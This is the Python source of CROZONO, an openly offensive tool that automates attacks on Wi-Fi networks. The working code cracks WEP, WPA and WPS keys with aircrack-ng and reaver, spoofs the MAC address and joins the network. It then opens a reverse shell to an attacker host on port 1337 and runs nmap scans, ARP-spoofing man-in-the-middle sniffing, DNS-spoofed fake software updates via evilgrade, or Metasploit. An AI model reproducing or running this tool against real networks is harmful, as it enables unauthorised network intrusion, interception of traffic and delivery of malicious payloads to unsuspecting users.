#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
-------------------------------------------------------------------------
  CROZONO - 01.07.15.23.46.00 - www.crozono.com - crozono.pro@gmail.com

  Author: Sheila Ayelen Berta a.k.a Shei Winker
	    Twitter: @UnaPibaGeek
        Web: www.semecayounexploit.com (SMC1E)

  Licensed under the GNU General Public License Version 2 (GNU GPL v2),
        available at: http://www.gnu.org/licenses/gpl-2.0.txt
  
  S2l3aSAoQS5WLkMpIGdyYWNpYXMgcG9yIGVuc2XDsWFybWUgbG8gbcOhcyBsaW5kbyBkZSBsYSB2aWRhLiBOdW5jYSB0ZSB2b3kgYSBvbHZpZGFyLi4u=
-------------------------------------------------------------------------

"""

## LIBRARIES ##
import os
import time
import pexpect
import getopt
import sys
import socket
import subprocess
import random
from sys import stdout
from subprocess import Popen, call, PIPE

## GLOBAL VARIABLES ##
OS_PATH = os.getcwd()
LOG_FILE = OS_PATH+'/log_temp'
DN = open(os.devnull, 'w')

def get_target_mitm(gateway,ip_crozono):
	targets = []
	nmap_report = open(OS_PATH+'/cr0z0n0_nmap','r')
	for line in nmap_report:
		if line.startswith('Nmap scan report for'):
			ip_start = line.find('192')
			targets.append(line[ip_start:60].replace(")"," ").strip())
	if gateway in targets:
		targets.remove(gateway)
	if ip_crozono in targets:
		targets.remove(ip_crozono)	
		
	return random.choice(targets)

def connect(essid,key,iface_mon):
	print("  [+] Connecting to {0} / {1}".format(essid,key))
	if iface_mon != '':
		call(['airmon-ng', 'stop', iface_mon], stdout=DN, stderr=DN)
		time.sleep(1)
	iface = get_iface()
	
	cmd_connect = pexpect.spawn('iwconfig {0} essid "{1}" key s:{2}'.format(iface,essid,key))
	cmd_connect.logfile = file(LOG_FILE,'w')
	cmd_connect.expect(['Error',pexpect.TIMEOUT,pexpect.EOF],3)
	cmd_connect.close()
	connected = False
	parse_log_connect = open(LOG_FILE,'r')
	for line in parse_log_connect:
		if line.find('Error') != -1:
			wpa_supplicant = open('/etc/wpa_supplicant/wpa_supplicant.conf','w')
			wpa_supplicant.write('ctrl_interface=/var/run/wpa_supplicant\n')
			wpa_supplicant.write('network={\n')
			wpa_supplicant.write('ssid="'+essid+'"\n')
			wpa_supplicant.write('key_mgmt=WPA-PSK\n')
			wpa_supplicant.write('psk="'+key.strip()+'"\n')
			wpa_supplicant.write('}')
			wpa_supplicant.close()
			call(['ifconfig', iface, 'down'])
			call(['dhclient', iface, '-r'])
			call(['ifconfig', iface, 'up'])
			call(['iwconfig', iface, 'mode', 'managed'])
			call(['killall', 'wpa_supplicant'], stdout=DN, stderr=DN)
			call(['wpa_supplicant', '-B','-c','/etc/wpa_supplicant/wpa_supplicant.conf','-i',iface], stdout=DN, stderr=DN)
			time.sleep(2)
	parse_log_connect.close()
	os.remove(LOG_FILE)
	call(['dhclient', iface], stdout=DN, stderr=DN)
	time.sleep(4)
	proc = Popen(['ifconfig', iface], stdout=PIPE, stderr=DN)
	for line in proc.communicate()[0].split('\n'):
		if line.find('inet addr:') != -1:
			inet = line.find('inet addr:')+10
			bcast = line.find('Bcast:')-1
			connected = line[inet:bcast]#IP

	return connected	

def save_key(essid,key):
	if os.path.exists(OS_PATH+'/pass_cracked'):
		os.remove(OS_PATH+'/pass_cracked')
	pass_log = open(OS_PATH+'/pass_cracked', 'w')
	pass_log.write(essid+':'+key)
	pass_log.close()
	

def WPA_attack(bssid,channel,iface_mon):
	#Delete old files:
	if os.path.exists(OS_PATH+'/cr0z0n0_attack-01.csv'):
		os.remove(OS_PATH+'/cr0z0n0_attack-01.csv')
		os.remove(OS_PATH+'/cr0z0n0_attack-01.cap')
		os.remove(OS_PATH+'/cr0z0n0_attack-01.kismet.csv')
		os.remove(OS_PATH+'/cr0z0n0_attack-01.kismet.netxml')
	
	cmd_airodump = pexpect.spawn('airodump-ng --bssid {0} -c {1} -w cr0z0n0_attack {2}'.format(bssid,channel,iface_mon))
	time.sleep(5)
	
	cmd_aireplay = pexpect.spawn('aireplay-ng -0 10 -a {0} {1}'.format(bssid,iface_mon))
	time.sleep(10)
	cmd_aireplay.close()		

	cmd_airodump.expect(['handshake:',pexpect.TIMEOUT,pexpect.EOF],180) #change time
	cmd_airodump.close()
		
	cmd_crack = pexpect.spawn('aircrack-ng -w dic cr0z0n0_attack-01.cap')
	cmd_crack.logfile = file(LOG_FILE,'w')
	cmd_crack.expect(['KEY FOUND!','Failed',pexpect.TIMEOUT,pexpect.EOF],20) #change time
	cmd_crack.close()
	key_found = False
	parse_log_crack = open(LOG_FILE,'r')
	for line in parse_log_crack:
		where = line.find('KEY FOUND!')
		if where > -1:
			key_end = line.find(']')
			key_found = line[where+13:key_end]
	parse_log_crack.close()
	os.remove(LOG_FILE)

	return key_found

def WPA_with_WPS_attack(bssid,channel,iface_mon):
	cmd_reaver = pexpect.spawn('reaver -i {0} -c {1} -b {2} -s n -K 1 -vv'.format(iface_mon,channel,bssid)) #no ended
	cmd_reaver.logfile = file(LOG_FILE,'w')
	cmd_reaver.expect(['WPS pin not found!',pexpect.TIMEOUT,pexpect.EOF],30)
	cmd_reaver.close()
	
	key_found = False
	parse_log_crack = open(LOG_FILE,'r')
	for line in parse_log_crack:
		if line.find('WPA PSK: ') != -1:
			key_found = line[line.find("WPA PSK: '") + 10:-1]			
	parse_log_crack.close()
	os.remove(LOG_FILE)

	return key_found

def WPS_check(bssid,iface_mon):
	cmd_wps = pexpect.spawn('wash -i {0}'.format(iface_mon))
	cmd_wps.logfile = file(LOG_FILE,'w')
	cmd_wps.expect([bssid,pexpect.TIMEOUT,pexpect.EOF],30)
	cmd_wps.close()
	WPS = False
	parse_log_wps = open(LOG_FILE,'r')
	for line in parse_log_wps:
		if line.find(bssid) != -1:
			WPS = True
	parse_log_wps.close()
	os.remove(LOG_FILE)

	return WPS

def WEP_attack(essid,bssid,channel,new_mac,iface_mon):
	#Delete old files:
	if os.path.exists(OS_PATH+'/cr0z0n0_attack-01.csv'):
		os.remove(OS_PATH+'/cr0z0n0_attack-01.csv')
		os.remove(OS_PATH+'/cr0z0n0_attack-01.cap')
		os.remove(OS_PATH+'/cr0z0n0_attack-01.kismet.csv')
		os.remove(OS_PATH+'/cr0z0n0_attack-01.kismet.netxml')

	proc_airodump = Popen(['airodump-ng', '--bssid', bssid, '-c', channel, '-w', 'cr0z0n0_attack', iface_mon], stdout=DN, stderr=DN)

	cmd_auth = pexpect.spawn('aireplay-ng -1 0 -e "{0}" -a {1} -h {2} {3}'.format(essid,bssid,new_mac,iface_mon))
	cmd_auth.logfile = file(LOG_FILE,'w')
	cmd_auth.expect(['Association successful',pexpect.TIMEOUT,pexpect.EOF],25)
	cmd_auth.close()
	parse_log_auth = open(LOG_FILE,'r')
	for line in parse_log_auth:
		if line.find('Association successful') != -1:
			print("      [+] Association successful")
	parse_log_auth.close()
	os.remove(LOG_FILE)

	proc_aireplay = Popen(['aireplay-ng', '-3', '-e', '"'+essid+'"', '-b', bssid, '-h', new_mac, iface_mon], stdout=DN, stderr=DN)
	
	time.sleep(300) #change time

	cmd_crack = pexpect.spawn('aircrack-ng cr0z0n0_attack-01.cap')
	cmd_crack.logfile = file(LOG_FILE,'w')
	cmd_crack.expect(['KEY FOUND!','Failed', pexpect.TIMEOUT,pexpect.EOF],30)
	cmd_crack.close()
	key_found = False
	parse_log_crack = open(LOG_FILE,'r')
	for line in parse_log_crack:
		where = line.find('KEY FOUND!')
		if where > -1:
			if line.find('ASCII') != -1:
				where2 = line.find('ASCII')
				key_end = line.find(')')
				key_found = line[where2+6:key_end]
			else:
				key_end = line.find(']')
				key_found = line[where+13:key_end]
	parse_log_crack.close()
	os.remove(LOG_FILE)

	return key_found

	

def scan_targets(iface_mon,essid_predefined):
	print ("  [+] Scanning WiFi access points (targets)...")
	#Delete old files:
	if os.path.exists(OS_PATH+'/cr0z0n0-01.csv'):
		os.remove(OS_PATH+'/cr0z0n0-01.csv')
		os.remove(OS_PATH+'/cr0z0n0-01.cap')
		os.remove(OS_PATH+'/cr0z0n0-01.kismet.csv')
		os.remove(OS_PATH+'/cr0z0n0-01.kismet.netxml')
	cmd_airodump = pexpect.spawn('airodump-ng -w cr0z0n0 {0}'.format(iface_mon))
	time.sleep(10)
	cmd_airodump.close()

	csv = open(OS_PATH+'/cr0z0n0-01.csv', 'r')

	if essid_predefined == '':
		#Get all APs:
		APs_list = []
		for line in csv:
			if line.startswith('BSSID,') or line == '\r\n': continue
			elif line.startswith('Station'): break
			else:
				data = line.split(',')
				if data[13] != '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00':
					APs_list.append([data[0],data[3],data[5],data[6],data[7],data[8],data[9],data[13]]) 
		#0:BSSID-0, 3:channel-1, 5:Privacy-2, 6:Cipher-3, 7:Auth-4, 8:Power-5, 9:Beacons-6, 13:ESSID-7
		csv.close()
		APs_list = sorted(APs_list,key = lambda x: x[5]) #APs sorted by the nearest

		APs_nearest = []
		#Get the first two nearest APs:	
		index = 1	
		for APs in APs_list:
			if index <= 2:
				APs_nearest.append(APs)
				index+=1
		APs_targets = sorted(APs_nearest,key = lambda x: x[6], reverse=True) #APs sorted by more amount of beacons
		target = APs_targets[0]
	else:
		target_found = False		
		for line in csv:
			if line.find(essid_predefined) != -1:
				target_found = True				
				data = line.split(',')
				target = [data[0],data[3],data[5],data[6],data[7],data[8],data[9],data[13]]	
		if target_found == False:
			print("  [x] Target not found!")
			exit()
	return target		

def mac_changer(iface_mon):
	call(['ifconfig', iface_mon, 'down'], stdout=DN, stderr=DN)
	call(['macchanger','-m','00:11:22:33:44:55', iface_mon], stdout=DN, stderr=DN)
	call(['ifconfig', iface_mon, 'up'], stdout=DN, stderr=DN)

	return '00:11:22:33:44:55'		

def enable_mode_monitor(iface):
	stdout.flush()
	call(['airmon-ng', 'start', iface], stdout=DN, stderr=DN)
	proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)

	for line in proc.communicate()[0].split('\n'):
		if line.find('Mode:Monitor') != -1:		
			iface_mon = line[:len(iface)+3]
			return iface_mon.strip()

def get_gateway():
	gateway = []
	proc = Popen(['route'], stdout=PIPE, stderr=DN)
	letters = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
	found_letter = False

	for line in proc.communicate()[0].split('\n'):
		if len(line) == 0 or line.startswith('Kernel') or line.startswith('Destination'): continue
		gateway = line[16:32]
		break
		
	for letter in letters:
		if gateway.find(letter) != -1:
			found_letter = True
			break
	
	if found_letter == True:
		gateway = socket.gethostbyname(str(gateway.strip()))
 
	return gateway

def get_iface():
	devices = []
	proc = Popen(['airmon-ng'], stdout=PIPE, stderr=DN)

	for line in proc.communicate()[0].split('\n'):
		if len(line) == 0 or line.startswith('Interface') or line.startswith('PHY'): continue
		devices.append(line)

	if devices[0].find("phy0") != -1:
		split_devices = devices[0].split('\t')
		iface = split_devices[1]
		return iface

def hardware_setup():
	print("  [+] Setting the hardware configuration... (MAC address changed)")			
	iface = get_iface()
	iface_mon = enable_mode_monitor(iface)
	
	return iface_mon

def banner():
	print '''

       ____   ____     ___    _____   ___    _   _    ___  
      / ___| |  _ \   / _ \  |__  /  / _ \  | \ | |  / _ \ 
     | |     | |_) | | | | |   / /  | | | | |  \| | | | | |
     | |___  |  _ <  | |_| |  / /_  | |_| | | |\  | | |_| |
      \____| |_| \_\  \___/  /____|  \___/  |_| \_|  \___/ 
	
	Sheila A. Berta - @UnaPibaGeek		   v1.0
	   Software Development 
	Pablo Romanos - @pabloromanos
	   Hardware Implementation
	'''

def main():
	
	banner()
	print("  [+] CROZONO Running...")
	
	essid_predefined = ''
	key_predefined = ''
	attack_predefined = ''
	attacker = ''

	options, remainder= getopt.getopt(sys.argv[1:], 'e:k:a:d:', ['essid','key','attack','dest'])
	for opt, arg in options:
		if opt in ('-e', '--essid'):
			essid_predefined = arg
		if opt in ('-k', '--key'):
			key_predefined = arg
		if opt in ('-a', '--attack'):
			attack_predefined = arg
		if opt in ('-d', '--dest'):
			attacker = arg
	
	if essid_predefined != '':
		if key_predefined != '':
			ap_target = False
			ip_lan = connect(essid_predefined,key_predefined,'')
		else:
			iface_mon = hardware_setup()
			new_mac = mac_changer(iface_mon)
			ap_target = scan_targets(iface_mon,essid_predefined)
	else:
		iface_mon = hardware_setup()
		new_mac = mac_changer(iface_mon)
		ap_target = scan_targets(iface_mon,'')
	
	if ap_target != False:	
		target_essid = ap_target[7].strip()
		target_bssid = ap_target[0].strip()
		target_channel = ap_target[1].strip()
		target_privacy = ap_target[2].strip()	
	
		print("  [+] Target selected: "+ target_essid)

		if target_privacy == 'WEP':
			print("  [+] Cracking "+target_essid+" access point with WEP privacy...")
			key = WEP_attack(target_essid,target_bssid,target_channel,new_mac,iface_mon)
			if key == False:
				print("  [-] Key not found! :(")
				exit()
			else:
				print("  [+] Key found!: "+key)
				save_key(target_essid,key)
				ip_lan = connect(target_essid,key,iface_mon)
	
		elif target_privacy == 'WPA' or target_privacy == 'WPA2' or target_privacy == 'WPA2 WPA':
			print("  [+] Cracking "+target_essid+" access point with "+target_privacy+" privacy...")
			WPS = WPS_check(target_bssid,iface_mon)
		
			if WPS == True:
				print("      [+] WPS is enabled")
				key = WPA_with_WPS_attack(target_bssid,target_channel,iface_mon)
				if key == False:
					print("      [-] PIN not found! Trying with conventional WPA attack...")
					key = WPA_attack(target_bssid,target_channel,iface_mon)
			else:
				print("      [-] WPS is not enabled")			
				key = WPA_attack(target_bssid,target_channel,iface_mon)
			
			if key == False:
				print("  [-] Key not found! :(")
				exit()
			else:
				print("  [+] Key found!: "+key)
				save_key(target_essid,key)
				ip_lan = connect(target_essid,key,iface_mon)
		else:
			print("  [+] Open network!")
			ip_lan = connect(target_essid,'',iface_mon)
	
	if ip_lan != False:
		ip_lan = ip_lan.strip()
		print("  [+] Connected! CROZONO is now into the target network (IP: "+ip_lan+")")
	else:
		print("  [-] Error! CROZONO is not connect to network!")
		exit()

	net = ip_lan.split('.')
	range_net = net[0]+'.'+net[1]+'.'+net[2]+'.1-255'
	#Delete old files:
	if os.path.exists(OS_PATH+'/cr0z0n0_nmap'):
		os.remove(OS_PATH+'/cr0z0n0_nmap')

	if attacker != '':
		print("  [+] Sending information about network to attacker ("+attacker+") and running attacks...")
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((attacker, 1337))
		os.dup2(s.fileno(),0)
		os.dup2(s.fileno(),1)
		os.dup2(s.fileno(),2)
		banner()
		print("  [+] Hello! :) ")
		print("  [+] Executing Nmap...")
		call(['nmap', '-O', '-sV', '-oN', 'cr0z0n0_nmap', '--exclude', ip_lan, range_net], stderr=DN)
	else:
		print("  [-] Error! attacker not defined!")
		exit()

	if attack_predefined == 'sniffing-mitm':
		iface = get_iface()
		gateway = get_gateway().strip()
		target_mitm = get_target_mitm(gateway,ip_lan)
		print("  [+] Executing MITM and Sniffing attacks between "+gateway+" and "+target_mitm+"...")
		cmd_ettercap = pexpect.spawn('sudo ettercap -T -M arp:remote /{0}/ /{1}/ -i {2}'.format(gateway,target_mitm,iface))
		time.sleep(2)
		#cmd_tshark = pexpect.spawn('tshark -i {0} -w cr0z0n0_sniff'.format(iface))		
		proc = subprocess.call(["tshark", "-i", iface], stderr=DN)

	elif attack_predefined == 'evilgrade':
		modules = open(OS_PATH+'/evilgrade/modules.txt', 'r')
		agent = OS_PATH+'/evilgrade/agent.exe'
		for line in modules:
			print line.replace('\n','')		
		print ("\n\n[+] Select module to use: ")
		plugin = raw_input()
		print ("[+] Thank you! Evilgrade will be executed!")
		s.shutdown(1)

		if os.path.exists('/etc/ettercap/etter.dns'):
			call(['rm', '/etc/ettercap/etter.dns'])
		etter_template = open(OS_PATH+'/evilgrade/etter.dns.template', 'r')
		etter_dns = open(OS_PATH+'/evilgrade/etter.dns','w')
		for line in etter_template:
			line = line.replace('IP', ip_lan)
			etter_dns.write(line)
		etter_dns.close()
		etter_template.close()
		call(['mv', './evilgrade/etter.dns', '/etc/ettercap/etter.dns'])

		evilgrade = pexpect.spawn('evilgrade')
		evilgrade.expect('evilgrade>')
		evilgrade.sendline('configure '+plugin)
		evilgrade.sendline('set agent '+agent)
		evilgrade.sendline('start')
		time.sleep(1)
		
		iface = get_iface()
		gateway = get_gateway().strip()
		target_mitm = get_target_mitm(gateway,ip_lan)
		cmd_ettercap = pexpect.spawn('ettercap -T -M arp:remote /{0}/ /{1}/ -i {2} -P dns_spoof'.format(gateway,target_mitm,iface))
		time.sleep(180) #change time

	elif attack_predefined == 'metasploit':
		print("  [+] Executing Metasploit...")
		proc = subprocess.call(["msfconsole"], stderr=DN)
	else:
		print("  [-] Attack not defined!")

	s.shutdown(1)

	print("  [+] CROZONO has finished! Good bye! ;)")
	
main()
